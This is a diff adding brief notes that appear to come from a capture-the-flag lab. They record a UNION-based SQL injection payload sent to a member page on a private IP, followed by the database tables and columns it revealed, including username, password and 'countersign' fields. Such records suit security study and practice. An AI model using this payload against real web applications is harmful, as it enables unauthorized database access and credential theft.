@@ -1,0 +1,36 @@
+http://192.168.1.16/?page=member
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+
+table_name: db_default
+column_name : id
+column_name : username
+column_name : password
+
+table_name: users
+column_name : user_id
+column_name : first_name
+column_name : last_name
+column_name : town
+column_name : country
+column_name : planet
+column_name : Commentaire
+column_name : countersign
+
+table_name: guestbook
+column_name : id_comment
+column_name : comment
+column_name : name
+
+table_name: list_images
+column_name : id
+column_name : url
+column_name : title
+column_name : comment
+
+table_name: vote_dbs
+column_name : id_vote
+column_name : vote
+column_name : nb_vote
+column_name : subject
+
+
